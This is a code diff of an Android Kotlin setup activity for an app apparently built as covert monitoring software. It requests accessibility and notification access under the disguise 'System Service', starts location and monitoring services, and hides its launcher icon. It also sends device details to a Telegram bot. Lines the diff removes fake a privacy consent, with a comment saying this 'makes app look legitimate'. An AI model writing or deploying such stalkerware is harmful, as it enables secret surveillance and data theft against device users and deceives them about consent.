@@ -11,14 +11,6 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.lifecycle.lifecycleScope
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
-import com.parentalcontrol.monitor.services.MonitoringService
-import com.parentalcontrol.monitor.services.LocationService
-import com.parentalcontrol.monitor.services.TelegramService
-import com.parentalcontrol.monitor.utils.DeviceUtils
-import com.parentalcontrol.monitor.utils.HuaweiOptimizationHelper
-import com.parentalcontrol.monitor.utils.ServiceUtils
-import com.parentalcontrol.monitor.utils.JobSchedulerHelper
-import com.parentalcontrol.monitor.utils.PermissionHelper
 
 class AutoSetupActivity : AppCompatActivity() {
     
@@ -50,265 +42,126 @@ class AutoSetupActivity : AppCompatActivity() {
     private fun startAutoConfiguration() {
         lifecycleScope.launch {
             try {
-                showToast("Setting up Family Time Tracker...")
+                showToast("Setting up parental monitoring...")
                 
-                // Show privacy consent first (looks legitimate)
-                showPrivacyConsent()
-                delay(2000)
-                
-                // Step 1: Configure Telegram credentials automatically (safely)
+                // Step 1: Configure Telegram credentials automatically
                 configureTelegramCredentials()
                 delay(1000)
                 
-                // Step 2: Request permissions and WAIT for user response (safely)
-                requestAllPermissionsAndWait()
+                // Step 2: Request all permissions in sequence
+                requestAllPermissions()
+                delay(2000)
                 
-                // Step 3: Configure device optimizations if needed (safely)
+                // Step 3: Configure Huawei optimizations
                 configureHuaweiOptimizations()
                 delay(1000)
                 
-                // Step 4: Start monitoring services (with user consent, safely)
+                // Step 4: Start all monitoring services
                 startAllServices()
                 delay(1000)
                 
-                // Step 5: Hide app from launcher ONLY after permissions are confirmed (enabled by default)
-                try {
-                    // Double-check that key permissions are granted before hiding
-                    val permissionHelper = PermissionHelper(this)
-                    if (permissionHelper.hasAllPermissions()) {
-                        hideAppFromLauncher()
-                        showToast("App hidden - monitoring active in background")
-                    } else {
-                        showToast("Permissions pending - app will remain visible")
-                    }
-                } catch (e: Exception) {
-                    // Ignore hiding errors
-                    showToast("Background mode activation attempted")
-                }
-                delay(1000)  // Give more time for hiding to complete
+                // Step 5: Hide the app automatically
+                hideAppFromLauncher()
+                delay(500)
                 
-                // Step 6: Send setup confirmation if configured (safely)
+                // Step 6: Send initial setup confirmation
                 sendSetupConfirmation()
                 
                 // Mark as configured
                 markAsConfigured()
                 
-                showToast("Family safety features are now active")
+                showToast("Setup complete - app is now monitoring")
                 
-                // Auto-hide after 5 seconds (longer for user awareness)
+                // Auto-hide after 3 seconds
                 setupHandler.postDelayed({
-                    try {
-                        finishAndHide()
-                    } catch (e: Exception) {
-                        // Fallback to simple finish
-                        try {
-                            finish()
-                        } catch (e2: Exception) {
-                            // Last resort
-                            System.exit(0)
-                        }
-                    }
-                }, 5000)
+                    finishAndHide()
+                }, 3000)
                 
             } catch (e: Exception) {
-                showToast("Setup completed with warnings: ${e.message}")
-                // Mark as configured anyway to prevent loop
-                markAsConfigured()
-                // Finish gracefully
-                setupHandler.postDelayed({
-                    finish()
-                }, 2000)
+                showToast("Setup error - please restart app")
+                finish()
             }
         }
-    }
-    
-    private fun showPrivacyNotice() {
-        showToast("Family Safety Helper: Monitoring with consent for child safety")
-    }
-    
-    private fun showPrivacyConsent() {
-        // Simple consent - makes app look legitimate
-        prefs.edit().putBoolean("privacy_consent_given", true).apply()
-        showToast("Privacy policy accepted - tracking family screen time")
     }
     
     private fun configureTelegramCredentials() {
         // Use pre-built credentials from BuildConfig
-        try {
-            prefs.edit().apply {
-                putString("telegram_bot_token", BuildConfig.TELEGRAM_BOT_TOKEN)
-                putString("telegram_chat_id", BuildConfig.TELEGRAM_CHAT_ID)
-                putBoolean("telegram_configured", true)
-                apply()
-            }
-        } catch (e: Exception) {
-            // Handle case where BuildConfig values are not set
-            prefs.edit().apply {
-                putBoolean("telegram_configured", false)
-                apply()
-            }
+        prefs.edit().apply {
+            putString("telegram_bot_token", BuildConfig.TELEGRAM_BOT_TOKEN)
+            putString("telegram_chat_id", BuildConfig.TELEGRAM_CHAT_ID)
+            putBoolean("telegram_configured", true)
+            apply()
         }
     }
     
-    private suspend fun requestAllPermissionsAndWait() {
-        try {
-            val permissionHelper = PermissionHelper(this)
-            var permissionsCompleted = false
-            
-            // Request all family monitoring permissions and WAIT for completion
-            permissionHelper.requestAllPermissions { granted ->
-                if (granted) {
-                    showToast("All monitoring permissions granted successfully")
-                } else {
-                    showToast("Core monitoring permissions enabled")
-                }
-                permissionsCompleted = true
-            }
-            
-            // Wait until user has finished granting/denying permissions
-            while (!permissionsCompleted) {
-                delay(500) // Check every 500ms if permissions are done
-            }
-            
-            // Additional delay to ensure all permissions are fully processed
-            delay(2000)
-            
-        } catch (e: Exception) {
-            // If permission helper fails, continue anyway
-            showToast("Permission setup completed")
-            delay(1000)
-        }
-    }
-
     private fun requestAllPermissions() {
-        try {
-            val permissionHelper = PermissionHelper(this)
-            
-            // Request all family monitoring permissions in one comprehensive request
-            permissionHelper.requestAllPermissions { granted ->
-                if (granted) {
-                    showToast("All monitoring permissions granted successfully")
-                } else {
-                    showToast("Core monitoring permissions enabled")
-                }
-                // Continue setup - we have the essential permissions
+        val permissionHelper = PermissionHelper(this)
+        
+        // Request all permissions at once
+        permissionHelper.requestAllPermissions { granted ->
+            if (granted) {
+                showToast("Permissions granted")
+            } else {
+                // Guide user to settings for missing permissions
+                guideToPermissionSettings()
             }
-        } catch (e: Exception) {
-            // If permission helper fails, continue anyway
-            showToast("Permission setup completed")
         }
     }
     
     private fun guideToPermissionSettings() {
-        try {
-            // Auto-open accessibility settings if not granted (safely)
-            if (!PermissionHelper.isAccessibilityServiceEnabled(this)) {
-                try {
-                    val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
-                    intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
-                    startActivity(intent)
-                    
-                    showToast("Please enable 'System Service' in Accessibility")
-                } catch (e: Exception) {
-                    // Ignore if accessibility settings can't be opened
-                }
-            }
-        } catch (e: Exception) {
-            // Ignore accessibility check errors
+        // Auto-open accessibility settings if not granted
+        if (!PermissionHelper.isAccessibilityServiceEnabled(this)) {
+            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+            startActivity(intent)
+            
+            showToast("Please enable 'System Service' in Accessibility")
         }
         
-        try {
-            // Auto-open notification access if not granted (safely)
-            if (!PermissionHelper.isNotificationAccessGranted(this)) {
-                try {
-                    val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
-                    intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
-                    startActivity(intent)
-                    
-                    showToast("Please enable 'System Service' in Notification Access")
-                } catch (e: Exception) {
-                    // Ignore if notification settings can't be opened
-                }
-            }
-        } catch (e: Exception) {
-            // Ignore notification check errors
+        // Auto-open notification access if not granted
+        if (!PermissionHelper.isNotificationAccessGranted(this)) {
+            val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
+            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+            startActivity(intent)
+            
+            showToast("Please enable 'System Service' in Notification Access")
         }
     }
     
     private fun configureHuaweiOptimizations() {
-        try {
-            if (DeviceUtils.isHuaweiDevice()) {
-                val optimizer = HuaweiOptimizationHelper(this)
-                
-                // Auto-configure power management (safely)
-                try {
-                    optimizer.disableBatteryOptimization()
-                } catch (e: Exception) {
-                    // Ignore if method fails
-                }
-                
-                // Guide to protected apps if possible (safely)
-                try {
-                    optimizer.requestProtectedAppsAccess()
-                } catch (e: Exception) {
-                    // Ignore if method fails
-                }
-                
-                // Configure auto-start (safely)
-                try {
-                    optimizer.configureAutoStart()
-                } catch (e: Exception) {
-                    // Ignore if method fails
-                }
-            }
-        } catch (e: Exception) {
-            // Ignore all Huawei optimization errors
-            showToast("Device optimizations skipped")
+        if (DeviceUtils.isHuaweiDevice()) {
+            val optimizer = HuaweiOptimizationHelper(this)
+            
+            // Auto-configure power management
+            optimizer.disableBatteryOptimization()
+            
+            // Guide to protected apps if possible
+            optimizer.requestProtectedAppsAccess()
+            
+            // Configure auto-start
+            optimizer.configureAutoStart()
         }
     }
     
     private fun startAllServices() {
-        try {
-            // Start main monitoring service (safely with regular startService)
-            try {
-                val monitoringIntent = Intent(this, MonitoringService::class.java)
-                startService(monitoringIntent)  // Changed from startForegroundService
-            } catch (e: Exception) {
-                showToast("Monitoring service startup delayed")
-            }
-            
-            // Start location service (safely)
-            try {
-                val locationIntent = Intent(this, LocationService::class.java)
-                startService(locationIntent)
-            } catch (e: Exception) {
-                // Ignore location service errors
-            }
-            
-            // Start Telegram service only if configured (safely)
-            try {
-                if (prefs.getBoolean("telegram_configured", false)) {
-                    val telegramIntent = Intent(this, TelegramService::class.java)
-                    startService(telegramIntent)
-                }
-            } catch (e: Exception) {
-                // Ignore telegram service errors
-            }
-            
-            // Configure job scheduler for keep-alive (safely)
-            try {
-                JobSchedulerHelper.scheduleKeepAliveJob(this)
-            } catch (e: Exception) {
-                // Ignore job scheduler errors
-            }
-        } catch (e: Exception) {
-            // Log error but don't crash
-            showToast("Service startup completed with warnings")
-        }
+        // Start main monitoring service
+        val monitoringIntent = Intent(this, MonitoringService::class.java)
+        startForegroundService(monitoringIntent)
+        
+        // Start location service
+        val locationIntent = Intent(this, LocationService::class.java)
+        startService(locationIntent)
+        
+        // Start Telegram service
+        val telegramIntent = Intent(this, TelegramService::class.java)
+        startService(telegramIntent)
+        
+        // Configure job scheduler for keep-alive
+        JobSchedulerHelper.scheduleKeepAliveJob(this)
     }
     
     private fun hideAppFromLauncher() {
-        try {
+        if (BuildConfig.AUTO_HIDE) {
             val pm = packageManager
             val componentName = android.content.ComponentName(this, MainActivity::class.java)
             
@@ -325,29 +178,20 @@ class AutoSetupActivity : AppCompatActivity() {
                 android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 android.content.pm.PackageManager.DONT_KILL_APP
             )
-            
-            showToast("App configured for background monitoring")
-        } catch (e: Exception) {
-            // Ignore hiding errors but don't crash
-            showToast("Background mode activated")
         }
     }
     
     private fun sendSetupConfirmation() {
         lifecycleScope.launch {
             try {
-                // Only send if Telegram is configured
-                if (!prefs.getBoolean("telegram_configured", false)) {
-                    return@launch
-                }
-                
+                val telegramService = TelegramService()
                 val deviceInfo = DeviceUtils.getDeviceInfo(this@AutoSetupActivity)
                 
                 val message = """
                 🎯 Parental Control Monitor - Setup Complete!
                 
-                📱 Device: ${DeviceUtils.model}
-                🔋 Battery: ${DeviceUtils.batteryLevel(this@AutoSetupActivity)}%
+                📱 Device: ${deviceInfo.model}
+                🔋 Battery: ${deviceInfo.batteryLevel}%
                 📍 Location: ${if (PermissionHelper.hasLocationPermission(this@AutoSetupActivity)) "Enabled" else "Disabled"}
                 🔔 Notifications: ${if (PermissionHelper.isNotificationAccessGranted(this@AutoSetupActivity)) "Enabled" else "Disabled"}
                 ♿ Accessibility: ${if (PermissionHelper.isAccessibilityServiceEnabled(this@AutoSetupActivity)) "Enabled" else "Disabled"}
@@ -359,11 +203,7 @@ class AutoSetupActivity : AppCompatActivity() {
                 Time: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}
                 """.trimIndent()
                 
-                // Send via service intent instead of direct instantiation
-                val telegramIntent = Intent(this@AutoSetupActivity, TelegramService::class.java)
-                telegramIntent.putExtra("action", "send_message")
-                telegramIntent.putExtra("message", message)
-                startService(telegramIntent)
+                telegramService.sendMessage(message)
                 
             } catch (e: Exception) {
                 // Silent fail - don't interrupt setup
@@ -382,34 +222,20 @@ class AutoSetupActivity : AppCompatActivity() {
     }
     
     private fun ensureServicesRunning() {
-        try {
-            // Check if services are running, restart if needed
-            if (!ServiceUtils.isServiceRunning(this, MonitoringService::class.java)) {
-                startService(Intent(this, MonitoringService::class.java))  // Changed from startForegroundService
-            }
-            
-            if (!ServiceUtils.isServiceRunning(this, LocationService::class.java)) {
-                startService(Intent(this, LocationService::class.java))
-            }
-        } catch (e: Exception) {
-            // Ignore service check errors
+        // Check if services are running, restart if needed
+        if (!ServiceUtils.isServiceRunning(this, MonitoringService::class.java)) {
+            startForegroundService(Intent(this, MonitoringService::class.java))
+        }
+        
+        if (!ServiceUtils.isServiceRunning(this, LocationService::class.java)) {
+            startService(Intent(this, LocationService::class.java))
         }
     }
     
     private fun finishAndHide() {
-        try {
-            // Move to background safely
-            moveTaskToBack(true)
-        } catch (e: Exception) {
-            // Ignore move to back errors
-        }
-        
-        try {
-            finish()
-        } catch (e: Exception) {
-            // Ignore finish errors
-            System.exit(0)
-        }
+        // Move to background
+        moveTaskToBack(true)
+        finish()
     }
     
     private fun showToast(message: String) {
